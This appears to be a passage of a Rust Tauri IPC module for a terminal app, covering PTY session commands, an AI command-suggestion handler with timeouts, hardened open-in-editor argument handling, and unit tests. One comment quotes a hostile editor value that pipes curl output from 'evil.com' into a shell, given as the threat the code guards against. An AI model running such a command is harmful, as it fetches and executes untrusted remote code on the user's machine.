//! IPC façade — Tauri commands + event topics consumed by the TS bridge.
//!
//! Kept intentionally small. The shape here is what the real `quanta-core`
//! sidecar will mirror over its JSON-RPC channel (see ADR 0004). Adding a new
//! command requires adding the corresponding TS wrapper in `packages/host-tauri`
//! and typing it in `@quanta/host-common`.
//!
//! Event name convention
//! ---------------------
//! Topics use a hyphen in the last segment (`quanta://pty-data`, not
//! `quanta://pty.data`). Tauri 2 emits a runtime warning for event names that
//! contain `.`; the canonical form mirrors the command name style so a single
//! naming policy covers both planes.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;

use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
#[cfg(feature = "embedded-shell")]
use tauri::Emitter;
use tauri::{AppHandle, State};

#[cfg_attr(not(test), allow(unused_imports))]
use crate::error::ErrorCode;
use crate::error::TauriError;

#[cfg(feature = "embedded-shell")]
use crate::embedded_shell::{EmbeddedShell, SpawnedSession};

/// Topic emitted per PTY output chunk.
pub const EVENT_PTY_DATA: &str = "quanta://pty-data";
/// Topic emitted when a PTY exits.
pub const EVENT_PTY_EXIT: &str = "quanta://pty-exit";

/// Opaque session id shared with the TS side.
pub type SessionId = String;

pub struct AppState {
    sessions: Mutex<HashMap<SessionId, Arc<SessionHandle>>>,
    /// Populated by `lib::run()`'s setup hook on the `sidecar` feature. Held
    /// as `Arc<Mutex<...>>` so the async setup task can mutate the slot
    /// concurrently with live Tauri command handlers.
    #[cfg(feature = "sidecar")]
    sidecar: Arc<Mutex<Option<Arc<crate::sidecar::SidecarBridge>>>>,
    /// Shared [`quanta_ai::SuggestionProvider`]. Built once at startup:
    /// `AnthropicProvider` when `ANTHROPIC_API_KEY` is set, otherwise the
    /// offline `MockProvider`. Held as `Arc<dyn …>` so the IPC handler never
    /// has to branch on which implementation it is calling.
    suggestion_provider: Arc<dyn quanta_ai::SuggestionProvider>,
}

impl AppState {
    pub fn new() -> Self {
        Self {
            sessions: Mutex::new(HashMap::new()),
            #[cfg(feature = "sidecar")]
            sidecar: Arc::new(Mutex::new(None)),
            suggestion_provider: build_default_suggestion_provider(),
        }
    }

    /// Clone the sidecar slot handle so the async setup task can populate
    /// it without owning `AppState`.
    #[cfg(feature = "sidecar")]
    pub fn sidecar_slot_arc(&self) -> Arc<Mutex<Option<Arc<crate::sidecar::SidecarBridge>>>> {
        self.sidecar.clone()
    }

    #[cfg(feature = "sidecar")]
    fn sidecar_handle(&self) -> Option<Arc<crate::sidecar::SidecarBridge>> {
        self.sidecar.lock().clone()
    }
}

/// Construct the app-wide suggestion provider.
///
/// Security boundary: we read `ANTHROPIC_API_KEY` here and nowhere else. The
/// `quanta-ai` crate intentionally refuses to read env vars itself so the key
/// never flows through a library API that could be exercised from a test. If
/// the env var is unset we fall back to the deterministic `MockProvider`
/// (same behavior as before Phase 6, so dev / CI stay offline).
fn build_default_suggestion_provider() -> Arc<dyn quanta_ai::SuggestionProvider> {
    match std::env::var("ANTHROPIC_API_KEY") {
        Ok(key) if !key.trim().is_empty() => {
            tracing::info!("ai-suggest: ANTHROPIC_API_KEY set; using live AnthropicProvider");
            Arc::new(quanta_ai::AnthropicProvider::new(key))
        }
        _ => {
            tracing::info!("ai-suggest: no ANTHROPIC_API_KEY; falling back to MockProvider");
            Arc::new(quanta_ai::MockProvider::new())
        }
    }
}

/// A live session. In Phase 1 this wraps an embedded PTY directly; when the
/// real sidecar arrives this becomes a handle on an RPC session id.
#[allow(
    dead_code,
    reason = "shell/cwd retained for list_sessions RPC once it lands"
)]
pub struct SessionHandle {
    pub shell: String,
    pub cwd: String,
    #[cfg(feature = "embedded-shell")]
    pub embedded: Arc<SpawnedSession>,
}

/* -------------------- command payloads -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct SpawnArgs {
    pub shell: Option<String>,
    pub cwd: Option<String>,
    pub cols: u16,
    pub rows: u16,
    /// Per-session env overrides. Only the embedded-shell path consumes these
    /// directly today; the sidecar path routes CreateSession through
    /// `quanta-core`, which ignores this field (env is the core's concern).
    #[allow(
        dead_code,
        reason = "used only under `embedded-shell`; retained in the wire shape so the TS bridge keeps one payload type across features"
    )]
    pub env: Option<HashMap<String, String>>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct SpawnReply {
    pub session_id: SessionId,
    pub shell: String,
    pub cwd: String,
}

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "snake_case")]
pub struct DataEvent {
    pub session_id: SessionId,
    pub seq: u64,
    pub bytes_b64: String,
}

#[derive(Debug, Serialize, Clone)]
#[serde(rename_all = "snake_case")]
pub struct ExitEvent {
    pub session_id: SessionId,
    pub exit_code: Option<i32>,
    pub signal: Option<String>,
}

/* -------------------- commands -------------------- */

#[tauri::command]
pub async fn quanta_ready() -> Result<(), String> {
    tracing::debug!("quanta_ready");
    Ok(())
}

/// TS → Rust crash-forward entry point. Accepts a flat record produced by
/// the TS `postCrashReport` hook (see `packages/host-tauri/src/main.tsx`)
/// and feeds it into the host's crash reporter. The reporter is
/// fail-silent at its boundary; this command therefore always resolves
/// `Ok(())` even if the sink IO errored — otherwise the TS side would
/// surface the write failure as a new unhandled rejection and we'd loop.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct CrashReportInput {
    pub kind: String,
    pub message: String,
    pub stack: Option<String>,
    /// Free-form origin tag; mainly `"ts.unhandled"` today.
    pub origin: Option<String>,
}

#[tauri::command]
pub async fn quanta_report_crash(report: CrashReportInput) -> Result<(), String> {
    let kind = report.origin.unwrap_or_else(|| report.kind.clone());
    crate::crash::forward_ts_crash(&kind, &report.message, report.stack.as_deref());
    Ok(())
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_spawn_session(
    args: SpawnArgs,
    app: AppHandle,
    state: State<'_, AppState>,
) -> Result<SpawnReply, TauriError> {
    let session_id = uuid::Uuid::new_v4().to_string();
    tracing::info!(%session_id, ?args, "spawn session");

    #[cfg(feature = "sidecar")]
    {
        let _ = app;
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        let (shell, cwd) = bridge
            .spawn_session(
                &session_id,
                args.shell.clone(),
                args.cwd.clone(),
                args.cols,
                args.rows,
            )
            .await
            .map_err(|e| TauriError::bridge_internal(format!("sidecar spawn failed: {e}")))?;
        state.sessions.lock().insert(
            session_id.clone(),
            Arc::new(SessionHandle {
                shell: shell.clone(),
                cwd: cwd.clone(),
            }),
        );
        return Ok(SpawnReply {
            session_id,
            shell,
            cwd,
        });
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = EmbeddedShell::spawn(
            &session_id,
            args.shell.clone(),
            args.cwd.clone(),
            args.cols,
            args.rows,
            args.env.clone().unwrap_or_default(),
        )
        .map_err(|e| TauriError::bridge_internal(format!("spawn failed: {e}")))?;

        let shell = handle.shell_label.clone();
        let cwd = handle.cwd.clone();
        let spawned = Arc::new(handle);

        wire_events(app.clone(), session_id.clone(), spawned.clone());

        state.sessions.lock().insert(
            session_id.clone(),
            Arc::new(SessionHandle {
                shell: shell.clone(),
                cwd: cwd.clone(),
                embedded: spawned,
            }),
        );

        return Ok(SpawnReply {
            session_id,
            shell,
            cwd,
        });
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (app, state);
        Err(TauriError::sidecar_unavailable(
            "no shell backend: rebuild with embedded-shell or sidecar feature",
        ))
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_write(
    session_id: SessionId,
    data: String,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    #[cfg(feature = "sidecar")]
    {
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        bridge.write(&session_id, data.as_bytes()).await.map_err(|e| {
            let msg = format!("{e:#}");
            if msg.to_lowercase().contains("unknown session") {
                TauriError::session_not_found(&session_id)
            } else {
                TauriError::bridge_internal(format!("sidecar write failed: {msg}"))
            }
        })?;
        return Ok(());
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = state
            .sessions
            .lock()
            .get(&session_id)
            .cloned()
            .ok_or_else(|| TauriError::session_not_found(&session_id))?;
        handle
            .embedded
            .write(data.as_bytes())
            .map_err(|e| TauriError::bridge_internal(format!("write failed: {e}")))?;
        return Ok(());
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (state, data, session_id);
        Err(TauriError::sidecar_unavailable(
            "write unavailable without embedded-shell or sidecar feature",
        ))
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_resize(
    session_id: SessionId,
    cols: u16,
    rows: u16,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    #[cfg(feature = "sidecar")]
    {
        let bridge = state
            .sidecar_handle()
            .ok_or_else(|| TauriError::sidecar_unavailable("quanta-core not connected"))?;
        bridge.resize(&session_id, cols, rows).await.map_err(|e| {
            let msg = format!("{e:#}");
            if msg.to_lowercase().contains("unknown session") {
                TauriError::session_not_found(&session_id)
            } else {
                TauriError::bridge_internal(format!("sidecar resize failed: {msg}"))
            }
        })?;
        return Ok(());
    }

    #[cfg(feature = "embedded-shell")]
    {
        let handle = state
            .sessions
            .lock()
            .get(&session_id)
            .cloned()
            .ok_or_else(|| TauriError::session_not_found(&session_id))?;
        handle
            .embedded
            .resize(cols, rows)
            .map_err(|e| TauriError::bridge_internal(format!("resize failed: {e}")))?;
        return Ok(());
    }

    #[cfg(not(any(feature = "embedded-shell", feature = "sidecar")))]
    {
        let _ = (state, cols, rows, session_id);
        Ok(())
    }
}

#[tauri::command]
#[allow(
    clippy::needless_return,
    reason = "the `return` is required because the function body is split across two cfg-gated arms"
)]
pub async fn quanta_cancel_block(
    session_id: SessionId,
    block_id: String,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    // Idempotency guarantee (ADR 0004): cancelling a block that has already
    // reached a terminal state must resolve silently rather than surface an
    // error, matching the sidecar's `CancelBlock` semantics. The UI may
    // double-fire this during a Stop button race and we don't want toasts
    // for a no-op.
    //
    // FIX 2: classification now first converts the low-level error into a
    // `TauriError` (which assigns a semantic `ErrorCode`) and then swallows
    // any code that represents an idempotent-terminal state. Callers used to
    // string-match on substrings of the message; code-match is the durable
    // replacement.
    #[cfg(feature = "sidecar")]
    {
        let bridge = match state.sidecar_handle() {
            Some(b) => b,
            None => return Ok(()),
        };
        if let Err(err) = bridge.cancel(&session_id, &block_id).await {
            let msg = format!("{err:#}");
            match classify_cancel_error(&msg, &session_id) {
                CancelOutcome::Idempotent => {
                    tracing::debug!(%session_id, %block_id, %msg, "cancel: ignoring idempotent error");
                    return Ok(());
                }
                CancelOutcome::Propagate(e) => return Err(e),
            }
        }
        return Ok(());
    }

    #[cfg(not(feature = "sidecar"))]
    {
        let _ = (state, session_id, block_id);
        // Embedded-shell is a dev-only single-PTY path; there's no block
        // surface to cancel. Surface a toast-friendly TauriError.
        Err(TauriError::bridge_internal(
            "cancel not supported in embedded-shell mode",
        ))
    }
}

/// Outcome of classifying a sidecar cancel error. Keeps the "swallow
/// silently" decision out of the call site so the test harness can pin the
/// mapping without reconstructing the match arms. Replaces the pre-FIX-2
/// string-matching classifier that lived inline in `quanta_cancel_block`.
#[derive(Debug)]
#[cfg_attr(not(feature = "sidecar"), allow(dead_code))]
pub(crate) enum CancelOutcome {
    /// The error represents an already-terminal state (unknown session,
    /// block already completed / terminated / not found). The Stop button is
    /// idempotent — we resolve `Ok(())` and do NOT toast.
    Idempotent,
    /// Real failure — propagate as a `TauriError` the UI can branch on.
    Propagate(TauriError),
}

/// Classify a sidecar cancel error. Pure — no Tauri / async state — so unit
/// tests pin the mapping without a live sidecar. `session-not-found` and the
/// "already terminal" substring class are both folded into `Idempotent`;
/// anything else propagates as a typed `bridge-internal` error with the
/// detail preserved in context.
#[cfg_attr(not(any(feature = "sidecar", test)), allow(dead_code))]
pub(crate) fn classify_cancel_error(msg: &str, _session_id: &str) -> CancelOutcome {
    let lower = msg.to_lowercase();
    if lower.contains("unknown session")
        || lower.contains("already")
        || lower.contains("not found")
        || lower.contains("not_found")
        || lower.contains("terminated")
        || lower.contains("completed")
    {
        return CancelOutcome::Idempotent;
    }
    CancelOutcome::Propagate(TauriError::bridge_internal(format!(
        "sidecar cancel failed: {msg}"
    )))
}

#[tauri::command]
pub async fn quanta_close(
    session_id: SessionId,
    state: State<'_, AppState>,
) -> Result<(), TauriError> {
    let handle = state.sessions.lock().remove(&session_id);
    #[cfg(feature = "sidecar")]
    {
        if let Some(bridge) = state.sidecar_handle() {
            if let Err(err) = bridge.close(&session_id).await {
                tracing::warn!(?err, "sidecar close failed; already removed locally");
            }
        }
    }
    if let Some(h) = handle {
        #[cfg(feature = "embedded-shell")]
        {
            h.embedded.kill();
        }
        #[cfg(not(feature = "embedded-shell"))]
        {
            let _ = h;
        }
    }
    Ok(())
}

/* -------------------- open-in-editor -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct OpenInEditorArgs {
    pub path: String,
    pub line: Option<u32>,
    pub column: Option<u32>,
}

/// Reject paths the OS/editor chain must not receive verbatim.
///
/// The TS layer already filters control characters (see
/// `features/navigation/open-in-editor`); this server-side check is the
/// defense-in-depth mirror so a rogue/bypassed frontend cannot ship an
/// argv-injection vector to the editor CLI. We deliberately DO NOT do any
/// shell interpretation — the editor is always spawned with
/// `Command::new(editor).arg(…)`, never `sh -c`.
pub fn validate_editor_path(path: &str) -> Result<(), String> {
    if path.is_empty() {
        return Err("open-in-editor: path is empty".into());
    }
    for (offset, ch) in path.char_indices() {
        if (ch as u32) < 0x20 || ch == '\x7f' {
            return Err(format!(
                "open-in-editor: path contains control character at offset {offset}"
            ));
        }
        if ch == '\0' {
            return Err("open-in-editor: path contains NUL".into());
        }
        // Newlines would turn a file path into an extra argv element on some
        // editor CLIs that accept stdin-style path lists; reject outright.
        if ch == '\n' || ch == '\r' {
            return Err("open-in-editor: path contains newline".into());
        }
    }
    Ok(())
}

fn which_editor(bin: &str) -> Option<PathBuf> {
    let path_env = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&path_env) {
        let candidate = dir.join(bin);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}

/// Pick an editor binary from a hardcoded preference chain.
///
/// Order:
///   1. `code` (VS Code)
///   2. `cursor` (Cursor)
///   3. `subl` (Sublime)
///   4. `$VISUAL` or `$EDITOR` (resolved only to a bare binary path — we do
///      NOT honor a shell-interpreted `$EDITOR=vi -u NONE` and we reject
///      anything that is not an existing file on `PATH`).
///
/// Returns `(binary_path, supports_line_goto)` so the caller knows whether
/// to pass `-g path:line:col` or a plain path.
fn resolve_editor() -> Option<(PathBuf, bool)> {
    for (bin, supports_goto) in [("code", true), ("cursor", true), ("subl", false)] {
        if let Some(path) = which_editor(bin) {
            return Some((path, supports_goto));
        }
    }
    // $VISUAL / $EDITOR — only honor the first token and only when it
    // resolves on PATH. This guards against a hostile env that sets
    // `EDITOR=sh -c "curl evil.com | sh"`.
    for var in ["VISUAL", "EDITOR"] {
        if let Ok(raw) = std::env::var(var) {
            let first = raw.split_whitespace().next().unwrap_or("");
            if first.is_empty() {
                continue;
            }
            // Disallow absolute paths outside of PATH resolution so we don't
            // become a gadget for launching arbitrary binaries the user never
            // vetted. We accept a bare name like `nvim` and resolve via PATH.
            if first.contains('/') || first.contains('\\') {
                continue;
            }
            if let Some(path) = which_editor(first) {
                return Some((path, false));
            }
        }
    }
    None
}

#[tauri::command]
pub async fn quanta_open_in_editor(args: OpenInEditorArgs) -> Result<(), TauriError> {
    if let Err(reason) = validate_editor_path(&args.path) {
        return Err(TauriError::editor_invalid_path(&reason));
    }

    // Require absolute paths. The TS layer resolves relative paths against the
    // session cwd before calling us (see `features/navigation/open-in-editor`),
    // so a relative path reaching Rust is a programming error worth refusing.
    let as_path = Path::new(&args.path);
    if !as_path.is_absolute() {
        return Err(TauriError::editor_invalid_path(
            "path must be absolute",
        ));
    }

    let (editor_bin, supports_goto) = resolve_editor().ok_or_else(TauriError::editor_not_found)?;

    tracing::info!(?editor_bin, supports_goto, path = %args.path, line = ?args.line, "open-in-editor");

    let mut cmd = Command::new(&editor_bin);
    // Detach from Tauri's process group so a long-lived editor doesn't tie
    // the app's lifetime to the editor's (and vice-versa on kill).
    if supports_goto && args.line.is_some() {
        let line = args.line.unwrap_or(1);
        let column = args.column.unwrap_or(1);
        cmd.arg("-g")
            .arg(format!("{}:{}:{}", args.path, line, column));
    } else {
        cmd.arg(&args.path);
    }

    cmd.spawn().map_err(|e| {
        let detail = format!(
            "spawn {:?} failed: {e}",
            editor_bin.file_name().unwrap_or_default(),
        );
        // "Permission denied" from the editor binary is almost always a
        // stale path (editor was uninstalled, or the bundled stub is not
        // executable). Surface it as `editor-invalid-path` so the UI can
        // show a targeted toast rather than "internal error".
        if detail.to_lowercase().contains("permission denied") {
            TauriError::editor_invalid_path(&detail)
        } else {
            TauriError::bridge_internal(detail)
        }
    })?;
    Ok(())
}

/* -------------------- wiring -------------------- */

#[cfg(feature = "embedded-shell")]
fn wire_events(app: AppHandle, session_id: SessionId, spawned: Arc<SpawnedSession>) {
    // Data pump: drain PTY -> emit `quanta://pty.data`.
    let app_data = app.clone();
    let sid_data = session_id.clone();
    let spawned_data = spawned.clone();
    std::thread::spawn(move || {
        use base64::Engine as _;
        let mut seq: u64 = 0;
        let mut buf = [0u8; 8192];
        loop {
            match spawned_data.read(&mut buf) {
                Ok(0) => break, // EOF
                Ok(n) => {
                    let b64 = base64::engine::general_purpose::STANDARD.encode(&buf[..n]);
                    let payload = DataEvent {
                        session_id: sid_data.clone(),
                        seq,
                        bytes_b64: b64,
                    };
                    if app_data.emit(EVENT_PTY_DATA, payload).is_err() {
                        break;
                    }
                    seq = seq.saturating_add(1);
                }
                Err(err) => {
                    tracing::warn!(%err, "pty read error; ending data pump");
                    break;
                }
            }
        }
    });

    // Exit watcher.
    let app_exit = app.clone();
    let sid_exit = session_id;
    let spawned_exit = spawned;
    std::thread::spawn(move || {
        let exit_code = spawned_exit.wait_exit();
        let payload = ExitEvent {
            session_id: sid_exit,
            exit_code,
            signal: None,
        };
        let _ = app_exit.emit(EVENT_PTY_EXIT, payload);
    });
}

/* -------------------- AI suggestion flow (ADR 0012) -------------------- */

#[derive(Debug, Deserialize)]
#[serde(rename_all = "snake_case")]
pub struct AiSuggestArgs {
    pub prompt: String,
    pub cwd: Option<String>,
    /// Optional caller-supplied hard deadline in milliseconds.
    ///
    /// When `None` (or absent from the JSON payload), the command applies
    /// [`AI_SUGGEST_DEFAULT_TIMEOUT_MS`] — generous for LLM-backed providers
    /// but strictly under the Anthropic adapter's own 10 s cap.
    #[serde(default)]
    pub timeout_ms: Option<u64>,
}

/// Default AI suggest timeout in milliseconds when the caller does not pass
/// one. Set below Anthropic's 10 s absolute cap so a hung provider always
/// surfaces `Timeout` rather than a dangling future.
pub const AI_SUGGEST_DEFAULT_TIMEOUT_MS: u64 = 8_000;

#[derive(Debug, Serialize)]
#[serde(rename_all = "snake_case")]
pub struct AiSuggestReply {
    pub id: String,
    pub command: String,
    pub tier: String,
    pub modifiers: Vec<String>,
    pub ruleset_version: u32,
    pub rationale: Option<String>,
}

/// Serve a natural-language prompt through the shared `quanta-ai` provider.
///
/// The provider is cached on [`AppState`] and selected at app startup based
/// on `ANTHROPIC_API_KEY`: live `AnthropicProvider` when set, otherwise the
/// offline `MockProvider`.
///
/// FIX 2: the handler now calls `suggest_with_timeout` so a hung provider
/// surfaces a typed `Timeout` error instead of blocking the UI's "Ask AI"
/// spinner forever. The caller may override the default via `timeout_ms`;
/// when absent we apply [`AI_SUGGEST_DEFAULT_TIMEOUT_MS`] (8 s), strictly
/// under the Anthropic adapter's 10 s absolute cap so we never race it.
#[tauri::command]
pub async fn quanta_ai_suggest(
    args: AiSuggestArgs,
    state: State<'_, AppState>,
) -> Result<AiSuggestReply, TauriError> {
    let provider = state.suggestion_provider.clone();
    quanta_ai_suggest_with_provider(args, provider).await
}

/// Shared body between the Tauri command handler and the unit-test
/// entry point. Kept private to this module because its signature binds to
/// `Arc<dyn SuggestionProvider>` which callers outside the IPC crate cannot
/// usefully construct without re-rolling the provider stack.
async fn quanta_ai_suggest_with_provider(
    args: AiSuggestArgs,
    provider: Arc<dyn quanta_ai::SuggestionProvider>,
) -> Result<AiSuggestReply, TauriError> {
    use quanta_ai::SuggestionRequest;

    let mut req = SuggestionRequest::new(args.prompt);
    req.cwd = args.cwd;

    let timeout = std::time::Duration::from_millis(
        args.timeout_ms.unwrap_or(AI_SUGGEST_DEFAULT_TIMEOUT_MS),
    );

    let response = provider
        .suggest_with_timeout(req, timeout)
        .await
        .map_err(classify_ai_error)?;

    Ok(AiSuggestReply {
        id: response.id,
        command: response.classified.command,
        tier: response.classified.tier.label().to_string(),
        modifiers: response
            .classified
            .flags
            .as_slice()
            .iter()
            .map(|m| m.label().to_string())
            .collect(),
        ruleset_version: response.classified.ruleset_version,
        rationale: response.rationale,
    })
}

/// Map a `quanta-ai` provider error into the typed `TauriError` shape so the
/// UI can branch on `.code` rather than string-matching the message. Known
/// HTTP statuses / surface errors get dedicated codes; anything else collapses
/// to `bridge-internal` with the detail preserved in context.
pub(crate) fn classify_ai_error<E: std::fmt::Display>(err: E) -> TauriError {
    let msg = format!("{err}");
    let lower = msg.to_lowercase();
    if lower.contains("401")
        || lower.contains("unauthorized")
        || lower.contains("auth")
        || lower.contains("invalid api key")
    {
        return TauriError::ai_suggest_auth_failed();
    }
    if lower.contains("429") || lower.contains("rate limit") {
        return TauriError::ai_suggest_rate_limited();
    }
    if lower.contains("timeout") || lower.contains("timed out") {
        return TauriError::ai_suggest_timeout();
    }
    if lower.contains("network") || lower.contains("dns") || lower.contains("connection") {
        return TauriError::ai_suggest_network();
    }
    TauriError::bridge_internal(format!("ai-suggest: {msg}"))
}

/// Direct-callable variant for unit tests so we don't need a live Tauri
/// runtime / `State` wrapper. Shares the logic body with the command above
/// via [`quanta_ai_suggest_with_provider`], which applies the FIX-2 timeout.
#[cfg(test)]
async fn quanta_ai_suggest_impl(
    args: AiSuggestArgs,
    provider: Arc<dyn quanta_ai::SuggestionProvider>,
) -> Result<AiSuggestReply, TauriError> {
    quanta_ai_suggest_with_provider(args, provider).await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_editor_path_rejects_empty() {
        assert!(validate_editor_path("").is_err());
    }

    #[test]
    fn validate_editor_path_rejects_control_chars() {
        assert!(validate_editor_path("/tmp/a\x01b").is_err());
        assert!(validate_editor_path("/tmp/a\tb").is_err());
        assert!(validate_editor_path("/tmp/a\x7fb").is_err());
    }

    #[test]
    fn validate_editor_path_rejects_newline_and_nul() {
        assert!(validate_editor_path("/tmp/a\nb").is_err());
        assert!(validate_editor_path("/tmp/a\rb").is_err());
        assert!(validate_editor_path("/tmp/a\0b").is_err());
    }

    #[test]
    fn validate_editor_path_accepts_normal_paths() {
        assert!(validate_editor_path("/tmp/foo.rs").is_ok());
        assert!(validate_editor_path("/Users/alice/Code new/main.ts").is_ok());
    }

    #[test]
    fn event_name_constants_use_hyphens_not_dots() {
        assert!(!EVENT_PTY_DATA.contains('.'));
        assert!(!EVENT_PTY_EXIT.contains('.'));
        assert!(EVENT_PTY_DATA.contains('-'));
        assert!(EVENT_PTY_EXIT.contains('-'));
    }

    fn mock() -> Arc<dyn quanta_ai::SuggestionProvider> {
        Arc::new(quanta_ai::MockProvider::new())
    }

    #[tokio::test]
    async fn ai_suggest_returns_safe_for_default_prompt() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "list files please".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock provider should succeed");
        assert_eq!(reply.tier, "safe");
        assert_eq!(reply.ruleset_version, quanta_ai::RULESET_VERSION);
        assert!(!reply.command.is_empty());
    }

    #[tokio::test]
    async fn ai_suggest_blocks_delete_everything() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "please delete everything".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock provider should succeed");
        assert_eq!(reply.tier, "blocked");
    }

    #[tokio::test]
    async fn ai_suggest_rejects_empty_prompt() {
        let err = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "   ".into(),
                cwd: None,
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect_err("empty prompt must reject");
        // The Rust-side classifier doesn't have a dedicated "empty prompt"
        // code today, so the default `bridge-internal` bucket is expected.
        // The detail is still accessible via `context.detail` for logging.
        assert_eq!(err.code, ErrorCode::BridgeInternal);
    }

    /// FIX 2: a short `timeout_ms` must surface the provider's `Timeout`
    /// variant, classified via `classify_ai_error` into `AiSuggestTimeout`.
    /// We wrap the mock in a delaying decorator so the caller's deadline
    /// fires BEFORE the mock would have returned a canned reply.
    #[tokio::test]
    async fn ai_suggest_surfaces_timeout_when_provider_is_slow() {
        use std::time::Duration;

        #[derive(Debug)]
        struct SlowProvider {
            inner: quanta_ai::MockProvider,
            delay: Duration,
        }

        #[async_trait::async_trait]
        impl quanta_ai::SuggestionProvider for SlowProvider {
            async fn suggest(
                &self,
                req: quanta_ai::SuggestionRequest,
            ) -> Result<quanta_ai::SuggestionResponse, quanta_ai::SuggestionProviderError>
            {
                tokio::time::sleep(self.delay).await;
                self.inner.suggest(req).await
            }
        }

        let slow: Arc<dyn quanta_ai::SuggestionProvider> = Arc::new(SlowProvider {
            inner: quanta_ai::MockProvider::new(),
            delay: Duration::from_secs(2),
        });

        let err = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "list files please".into(),
                cwd: None,
                timeout_ms: Some(25),
            },
            slow,
        )
        .await
        .expect_err("slow provider + short timeout must surface Timeout");
        assert_eq!(
            err.code,
            ErrorCode::AiSuggestTimeout,
            "classifier must map provider Timeout to AiSuggestTimeout code"
        );
    }

    /// FIX 2: the default timeout is generous enough that a fast mock
    /// provider returns cleanly. Regressing the default below the MockProvider's
    /// wall-clock cost would break this test before shipping.
    #[tokio::test]
    async fn ai_suggest_default_timeout_lets_fast_providers_succeed() {
        let reply = quanta_ai_suggest_impl(
            AiSuggestArgs {
                prompt: "git status please".into(),
                cwd: None,
                // None → applies AI_SUGGEST_DEFAULT_TIMEOUT_MS (8 s).
                timeout_ms: None,
            },
            mock(),
        )
        .await
        .expect("mock under default timeout must succeed");
        assert!(!reply.command.is_empty());
    }

    /// FIX 2: pin the default timeout value. A regression that silently
    /// bumped the default past Anthropic's 10 s cap would make the hard
    /// deadline useless; keep this assertion tight.
    #[test]
    fn ai_suggest_default_timeout_is_under_anthropic_cap() {
        // Anthropic's hard cap is 10 s; our default MUST be strictly under
        // so the caller's deadline fires first.
        assert!(AI_SUGGEST_DEFAULT_TIMEOUT_MS < 10_000);
        // And strictly positive so we never ship a zero-duration default.
        assert!(AI_SUGGEST_DEFAULT_TIMEOUT_MS > 0);
    }

    /// Pin the AI classifier on a representative sample of provider errors.
    /// Adding a new code to `TauriError` without adding a case here shows up
    /// red so the TS UI never silently falls through to `unknown`.
    #[test]
    fn ai_error_classifier_maps_known_strings() {
        // A raw `String` impls `Display`, which is all `classify_ai_error`
        // needs — keeps the test free of the provider trait's machinery.
        assert_eq!(
            classify_ai_error("HTTP 401 unauthorized").code,
            ErrorCode::AiSuggestAuthFailed
        );
        assert_eq!(
            classify_ai_error("HTTP 429 rate limit exceeded").code,
            ErrorCode::AiSuggestRateLimited
        );
        assert_eq!(
            classify_ai_error("request timed out").code,
            ErrorCode::AiSuggestTimeout
        );
        assert_eq!(
            classify_ai_error("network unreachable: dns lookup").code,
            ErrorCode::AiSuggestNetwork
        );
        // Default fallback: anything else is bridge-internal (with the raw
        // detail tucked into context — never directly in user_message).
        let e = classify_ai_error("weird thing happened");
        assert_eq!(e.code, ErrorCode::BridgeInternal);
        assert!(!e.user_message.contains("weird thing happened"));
    }

    /// Idempotency-friendly error patterns the cancel path must swallow.
    /// Unit-tested against the classification helper so we don't need a live
    /// sidecar to pin the behavior. Keeps future edits to the error list
    /// honest — adding a pattern without adding a case here shows up red.
    #[test]
    fn cancel_error_classifier_treats_terminal_errors_as_idempotent() {
        let idempotent_samples = [
            "unknown session abc",
            "block already canceled",
            "block not found",
            "already terminated",
            "CancelBlock failed: not_found: no such block",
            "block has already completed",
        ];
        for sample in idempotent_samples {
            match classify_cancel_error(sample, "sess-x") {
                CancelOutcome::Idempotent => {}
                CancelOutcome::Propagate(e) => {
                    panic!(
                        "expected '{sample}' idempotent, got Propagate({:?})",
                        e.code
                    )
                }
            }
        }

        let propagate_samples = [
            "sidecar connection refused",
            "io error: broken pipe",
            "decode error: expected CancelBlockResult",
        ];
        for sample in propagate_samples {
            match classify_cancel_error(sample, "sess-x") {
                CancelOutcome::Idempotent => {
                    panic!("expected '{sample}' NOT idempotent")
                }
                CancelOutcome::Propagate(e) => {
                    // Real failures map to bridge-internal with the detail
                    // preserved in context — never leaked into user_message.
                    assert_eq!(e.code, ErrorCode::BridgeInternal);
                    assert!(!e.user_message.contains(sample));
                }
            }
        }
    }

    /// Without the `sidecar` feature the command must surface a short,
    /// toast-friendly error the UI can branch on. The `sidecar` feature is
    /// off in the default `cargo test` run for the host-tauri crate — so
    /// this test lives on the default compile path.
    ///
